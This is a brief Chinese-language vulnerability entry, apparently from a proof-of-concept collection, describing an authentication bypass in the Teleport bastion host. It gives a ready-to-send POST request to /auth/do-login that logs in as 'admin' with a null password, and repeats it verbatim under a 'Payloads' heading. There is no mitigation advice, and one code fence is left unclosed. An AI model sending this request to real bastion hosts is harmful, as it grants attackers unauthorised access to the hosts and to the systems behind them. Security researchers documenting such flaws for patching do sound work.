# Teleport堡垒机 do-login 任意用户登录漏洞

## 漏洞描述
Teleport堡垒机存在任意用户登录漏洞，攻击者通过构造特殊的请求包可以登录堡垒机获取其他系统权限

## 危害等级
LOW

## 参考链接

## 漏洞复现方法
登录页面

![image-20220824134958109](images/202208241349427.png)

验证POC， captcha参数为验证码

```
POST /auth/do-login

args={"type":2,"username":"admin","password":null,"captcha":"ykex","oath":"","remember":false}

## Payloads
```
POST /auth/do-login

args={"type":2,"username":"admin","password":null,"captcha":"ykex","oath":"","remember":false}
```
